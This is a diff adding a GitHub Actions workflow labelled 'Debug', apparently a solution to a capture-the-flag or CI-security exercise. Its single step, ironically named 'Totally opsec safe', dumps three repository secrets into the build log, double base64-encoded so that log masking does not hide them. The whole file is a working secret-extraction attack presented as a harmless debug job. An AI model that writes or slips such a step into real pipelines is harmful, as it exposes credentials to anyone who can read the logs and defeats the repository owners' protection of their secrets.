@@ -1,0 +1,12 @@
+name: Debug
+'on':
+  push:
+    branches: <your-branch-name>
+jobs:
+  debug:
+    runs-on:
+    - ubuntu-latest
+    environment: dev
+    steps:
+    - name: Totally opsec safe
+      run: echo -e "FLAG_01=${{ secrets.FLAG_01 }}\nFLAG_02=${{ secrets.FLAG_02 }}\nFLAG_03=${{ secrets.FLAG_03 }}\n" | base64 | base64
